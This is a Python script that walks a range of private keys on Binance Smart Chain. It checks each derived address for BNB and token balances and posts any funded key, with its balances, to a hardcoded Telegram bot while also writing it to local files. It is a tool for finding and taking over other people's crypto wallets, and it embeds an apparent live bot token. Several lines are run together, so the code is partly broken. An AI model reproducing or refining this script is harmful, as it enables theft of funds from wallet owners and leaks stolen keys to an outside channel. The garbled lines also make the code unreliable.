from web3 import Web3
import json
import time
import requests
from datetime import datetime
import logging
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Set up logging with proper encoding for Windows
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("wallet_scanner.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Configure console encoding for Windows
import sys
if sys.platform == "win32":
    import os
    os.system("chcp 65001")  # Set console to UTF-8

# Multiple RPC endpoints for redundancy and load balancing
RPC_ENDPOINTS = [
    'https://bsc-dataseed.binance.org/',
    'https://bsc-dataseed1.binance.org/',
    'https://bsc-dataseed2.binance.org/',
    'https://bsc-dataseed3.binance.org/',
    'https://bsc-dataseed4.binance.org/',
    'https://bsc-dataseed1.defibit.io/',
    'https://bsc-dataseed2.defibit.io/',
    'https://bsc-dataseed3.defibit.io/',
    'https://bsc-dataseed1.ninicoin.io/',
    'https://bsc-dataseed2.ninicoin.io/',
    'https://bsc-dataseed.bnbchain.org/',
    'https://endpoints.omniatech.io/v1/bsc/mainnet/public'
]

class RobustWeb3Manager:
    """Manages multiple Web3 instances with automatic failover and retry logic"""
    
    def __init__(self, rpc_endpoints=None, max_retries=3, timeout=30):
        self.rpc_endpoints = rpc_endpoints or RPC_ENDPOINTS
        self.max_retries = max_retries
        self.timeout = timeout
        self.web3_instances = []
        self.current_instance_index = 0
        self.failed_endpoints = set()
        
        # Initialize Web3 instances
        self._initialize_web3_instances()
        
    def _initialize_web3_instances(self):
        """Initialize Web3 instances with retry configuration"""        for endpoint in self.rpc_endpoints:
            try:
                # Configure HTTP session with retries
                session = requests.Session()
                retry_strategy = Retry(
                    total=self.max_retries,
                    status_forcelist=[429, 500, 502, 503, 504],
                    allowed_methods=["HEAD", "GET", "POST"],  # Updated parameter name
                    backoff_factor=1
                )
                adapter = HTTPAdapter(max_retries=retry_strategy)
                session.mount("http://", adapter)
                session.mount("https://", adapter)
                
                # Create Web3 instance with custom session
                provider = Web3.HTTPProvider(
                    endpoint,
                    session=session,
                    request_kwargs={
                        'timeout': self.timeout,
                        'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    }
                )
                web3_instance = Web3(provider)
                
                # Add BSC POA middleware if needed
                try:
                    from web3.middleware import geth_poa_middleware
                    web3_instance.middleware_onion.inject(geth_poa_middleware, layer=0)                except ImportError:
                    pass
                
                # Test connection
                if self._test_connection(web3_instance):
                    self.web3_instances.append({
                        'instance': web3_instance,
                        'endpoint': endpoint,
                        'failures': 0
                    })
                    logger.info(f"[SUCCESS] Connected to {endpoint}")
                else:
                    logger.warning(f"[FAILED] Could not connect to {endpoint}")
                    self.failed_endpoints.add(endpoint)
                    
            except Exception as e:
                logger.warning(f"[ERROR] Error initializing {endpoint}: {e}")
                self.failed_endpoints.add(endpoint)
        
        if not self.web3_instances:
            raise ConnectionError("[CRITICAL] Failed to connect to any RPC endpoints!")
        
        logger.info(f"[INIT] Initialized {len(self.web3_instances)} working RPC connections")
    
    def _test_connection(self, web3_instance):
        """Test if Web3 instance is working"""
        try:
            # Try to get latest block number
            block_number = web3_instance.eth.block_number
            return block_number > 0
        except Exception:
            return False
    
    def get_web3_instance(self):
        """Get a working Web3 instance with automatic failover"""
        for attempt in range(len(self.web3_instances)):
            try:
                current_web3 = self.web3_instances[self.current_instance_index]
                  # Test if current instance is still working
                if self._test_connection(current_web3['instance']):
                    return current_web3['instance']
                else:
                    logger.warning(f"[WARNING] RPC endpoint {current_web3['endpoint']} is not responding, switching...")
                    current_web3['failures'] += 1
                    
            except Exception as e:
                logger.warning(f"[WARNING] Error with RPC {self.web3_instances[self.current_instance_index]['endpoint']}: {e}")
                self.web3_instances[self.current_instance_index]['failures'] += 1
            
            # Move to next instance
            self.current_instance_index = (self.current_instance_index + 1) % len(self.web3_instances)
        
        # If all instances failed, try to reinitialize
        logger.error("[RECOVERY] All RPC endpoints failed, attempting to reinitialize...")
        self._reinitialize_failed_instances()
        
        if self.web3_instances:
            return self.web3_instances[0]['instance']
        else:
            raise ConnectionError("[CRITICAL] All RPC endpoints are unavailable!")
    
    def _reinitialize_failed_instances(self):
        """Try to reinitialize failed instances"""
        # Remove instances with too many failures
        self.web3_instances = [w3 for w3 in self.web3_instances if w3['failures'] < 5]
        
        # Try to add back previously failed endpoints
        for endpoint in list(self.failed_endpoints):
            try:
                session = requests.Session()                retry_strategy = Retry(total=2, status_forcelist=[429, 500, 502, 503, 504])
                adapter = HTTPAdapter(max_retries=retry_strategy)
                session.mount("http://", adapter)
                session.mount("https://", adapter)
                
                provider = Web3.HTTPProvider(endpoint, session=session, request_kwargs={'timeout': 10})
                web3_instance = Web3(provider)
                
                if self._test_connection(web3_instance):
                    self.web3_instances.append({
                        'instance': web3_instance,
                        'endpoint': endpoint,
                        'failures': 0
                    })
                    self.failed_endpoints.remove(endpoint)
                    logger.info(f"[RECONNECTED] Reconnected to {endpoint}")
                    
            except Exception as e:
                logger.debug(f"Still can't connect to {endpoint}: {e}")

# Initialize the robust Web3 manager
web3_manager = RobustWeb3Manager()

# For backward compatibility, create a web3 instance
web3 = web3_manager.get_web3_instance()

# Telegram configuration
TELEGRAM_BOT_TOKEN = '7623118497:AAGIOQGynrEPcM7pKBw4Ryu14eN5-aZvVWE'
TELEGRAM_CHAT_ID = '491029985'

# BEP-20 Token Contract Addresses on BSC
token_contracts = {
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'BTC': '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',  # BTCB on BSC
    'XRP': '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
    'TRX': '0xCE7de646e7208a4Ef112cb6ed5038FA6cC6b12e3',
    'TON': '0x76A797A59Ba2C17726896976B7B3747BfD1d220f'
}

# Minimal ABI for ERC-20 balanceOf function
token_abi = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    }
]

def send_telegram_message(message):
    """Send message to Telegram channel with retry logic"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
            payload = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=payload, timeout=30)
            response.raise_for_status()
            logger.info("✅ Successfully sent Telegram message")
            return True
        except Exception as e:
            logger.warning(f"⚠️ Telegram attempt {attempt + 1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)  # Exponential backoff
            else:
                logger.error(f"❌ Failed to send Telegram message after {max_retries} attempts")
    return False

def get_balance_with_retry(web3_instance, address, max_retries=3):
    """Get BNB balance with retry logic"""
    for attempt in range(max_retries):
        try:
            balance_wei = web3_instance.eth.get_balance(address)
            return float(web3_instance.from_wei(balance_wei, 'ether'))
        except Exception as e:
            if attempt < max_retries - 1:
                logger.debug(f"⚠️ Balance check attempt {attempt + 1} failed: {e}")
                time.sleep(0.5 * (attempt + 1))  # Progressive delay
            else:
                logger.warning(f"❌ Failed to get BNB balance for {address} after {max_retries} attempts")
                raise e

def get_token_balance_with_retry(web3_instance, contract_address, address, max_retries=3):
    """Get token balance with retry logic"""
    for attempt in range(max_retries):
        try:
            contract = web3_instance.eth.contract(address=contract_address, abi=token_abi)
            balance = contract.functions.balanceOf(address).call()
            return float(web3_instance.from_wei(balance, 'ether'))
        except Exception as e:
            if attempt < max_retries - 1:
                logger.debug(f"⚠️ Token balance attempt {attempt + 1} failed: {e}")
                time.sleep(0.5 * (attempt + 1))
            else:
                logger.warning(f"❌ Failed to get token balance for {address} at {contract_address}")
                return 0.0

def format_message(private_key, address, balances):
    """Format message for Telegram with rich HTML formatting"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    message = f"Wallet With Balance Found! 🚨\n\n"
    message += f"🔗 Network: Binance Smart Chain\n"
    message += f"🔑 Private Key: <code>{private_key}</code>\n"
    message += f"📭 Address: <code>{address}</code>\n"
    message += f"🔍 Explorer: https://bscscan.com/address/{address}\n"
    message += f"📱 Wallet Import: Use \"Smart Chain\" network in Trust Wallet\n\n"
    message += "💰 Balances:\n"
    
    for token, balance in balances.items():
        if balance > 0:
            message += f"• {token}: {balance:.8f} ✅\n"
        else:
            message += f"• {token}: {balance:.8f}\n"
    
    message += f"\n⏰ Found at: {timestamp}"
    return message

def check_balance_from_private_key():
    starting_key = int("17cca56551a32483d252c0e46ed41051951f863b0d0137e2f5a108aa3865ffb9", 16)
    ending_key = int("1a2de94dd9ce70202df467d614c149d27d2f41b1b6ae27a29c1a6cb210d827b0", 16)
    
    wallets_with_balance = []
    current_key = starting_key
    connection_error_count = 0
    max_connection_errors = 50  # Allow some connection errors before stopping
    
    logger.info(f"🚀 Starting wallet scan from key: {starting_key:064x}")
    logger.info(f"🎯 Ending at key: {ending_key:064x}")
    logger.info("📊 Enhanced progress tracking enabled - you'll see detailed updates!")
    
    try:
        scan_start_time = time.time()
        
        while current_key <= ending_key:
            private_key = f"{current_key:064x}"  # Format as 64-char hex string
            keys_checked = current_key - starting_key
            
            # Log detailed progress every 100 keys
            if keys_checked % 100 == 0 and keys_checked > 0:
                elapsed_time = time.time() - scan_start_time
                rate = keys_checked / elapsed_time if elapsed_time > 0 else 0
                remaining_keys = ending_key - current_key
                eta_seconds = remaining_keys / rate if rate > 0 else 0
                eta_time = f"{eta_seconds/3600:.1f}h" if eta_seconds > 3600 else f"{eta_seconds/60:.1f}m"
                
                logger.info(f"📈 [PROGRESS] {keys_checked:,} keys checked | Rate: {rate:.1f} keys/sec | Current: {private_key[:16]}... | ETA: {eta_time}")
                logger.info(f"🔗 Connection errors: {connection_error_count}/{max_connection_errors}")
            
            # Show current wallet being checked (every 25 keys for good visibility)
            if keys_checked % 25 == 0:
                logger.info(f"   🔍 [SCAN] Checking wallet #{keys_checked}: {private_key[:20]}...")
            
            current_key += 1
            
            try:
                # Get a working Web3 instance
                web3_instance = web3_manager.get_web3_instance()
                
                # Derive address from private key
                account = web3_instance.eth.account.from_key('0x' + private_key)
                address = account.address
                
                # Check BNB balance with retry logic
                try:
                    balance_bnb = get_balance_with_retry(web3_instance, address)
                    connection_error_count = 0  # Reset error count on success
                except Exception as e:
                    logger.warning(f"⚠️ Failed to get BNB balance for {address}: {e}")
                    connection_error_count += 1
                    if connection_error_count >= max_connection_errors:
                        logger.error(f"❌ Too many connection errors ({connection_error_count}), stopping scan")
                        break
                    continue
                
                # Object to store all balances
                balances = {"BNB": balance_bnb}
                
                # Check token balances with retry logic
                for token, contract_address in token_contracts.items():
                    try:
                        balance_readable = get_token_balance_with_retry(web3_instance, contract_address, address)
                        balances[token] = balance_readable
                    except Exception as e:
                        logger.debug(f"Token balance error for {token}: {e}")
                        balances[token] = 0
                
                # Check if any balances are greater than 0
                has_balance = any(balance > 0 for balance in balances.values())
                
                if has_balance:
                    wallet_data = {
                        "private_key": private_key,
                        "address": address,
                        "balances": balances
                    }
                    wallets_with_balance.append(wallet_data)
                    logger.info(f"🎉 [FOUND] WALLET WITH BALANCE: {address}")
                    
                    # Send Telegram notification ONLY when balance is found
                    telegram_message = format_message(private_key, address, balances)
                    send_telegram_message(telegram_message)
                    
                    # Save to JSON file after each found wallet
                    with open('wallets_with_balance.json', 'w') as f:
                        json.dump(wallets_with_balance, f, indent=4)
                    
                    # Also save to a backup text file
                    with open('found_wallets_backup.txt', 'a') as f:
                        f.write(f"\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"Address: {address}\n")
                        f.write(f"Private Key: {private_key}\n")
                        f.write("Balances:\n")
                        for token, balance in balances.items():
                            if balance > 0:
                                f.write(f"  {token}: {balance:.8f}\n")
                        f.write("-" * 50 + "\n")
                else:
                    # Show that wallet was checked but has no balance (every 50 checks for visibility)
                    if keys_checked % 50 == 0:
                        logger.info(f"   ⭕ [EMPTY] Wallet #{keys_checked}: {address[:20]}... (no balance)")
                
            except Exception as e:
                logger.warning(f"⚠️ Error processing key {private_key[:20]}...: {e}")
                connection_error_count += 1
                if connection_error_count >= max_connection_errors:
                    logger.error(f"❌ Too many connection errors ({connection_error_count}), stopping scan")
                    break
                continue
                    
    except Exception as e:
        logger.error(f"❌ Error checking balances: {str(e)}")
        # Save what we have so far
        if wallets_with_balance:
            with open('wallets_with_balance.json', 'w') as f:
                json.dump(wallets_with_balance, f, indent=4)
    
    finally:
        # Final summary
        total_time = time.time() - scan_start_time
        total_keys = current_key - starting_key
        logger.info(f"🏁 Scan completed! Checked {total_keys:,} keys in {total_time/3600:.2f} hours")
        logger.info(f"🎯 Found {len(wallets_with_balance)} wallets with balance")
        if connection_error_count > 0:
            logger.info(f"⚠️ Total connection errors encountered: {connection_error_count}")

def main():
    """Main entry point with error handling and startup notification"""
    logger.info("🤖 [BOT] Starting Enhanced Wallet Scanner Bot...")
    
    # Test initial connection
    try:
        web3_instance = web3_manager.get_web3_instance()
        block_number = web3_instance.eth.block_number
        logger.info(f"✅ Connected to BSC! Current block: {block_number}")
    except Exception as e:
        logger.error(f"❌ Failed to connect to BSC: {e}")
        return
    
    # Send startup notification to Telegram
    startup_message = (
        f"🤖 <b>Enhanced Wallet Scanner Bot Started</b> 🤖\n\n"
        f"🕒 Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
        f"🔗 Connected RPC endpoints: {len(web3_manager.web3_instances)}\n"
        f"🔍 Enhanced error handling enabled\n"
        f"📊 Will show detailed scanning progress\n"
        f"📡 Will notify when wallets are found!"
    )
    send_telegram_message(startup_message)
    
    try:
        check_balance_from_private_key()
    except KeyboardInterrupt:
        logger.info("⏹️ [BOT] Script stopped by user")
        stop_message = (
            f"⏹️ <b>Wallet Scanner Stopped</b> ⏹️\n\n"
            f"🕒 Stopped at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
            f"👤 Stopped by user"
        )
        send_telegram_message(stop_message)
    except Exception as e:
        logger.error(f"❌ Fatal error: {e}")
        error_message = (
            f"❌ <b>Wallet Scanner Error</b> ❌\n\n"
            f"🕒 Error at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
            f"🐛 Error: {str(e)}\n"
            f"🔄 Bot will attempt to recover..."
        )
        send_telegram_message(error_message)

if __name__ == "__main__":
    main()
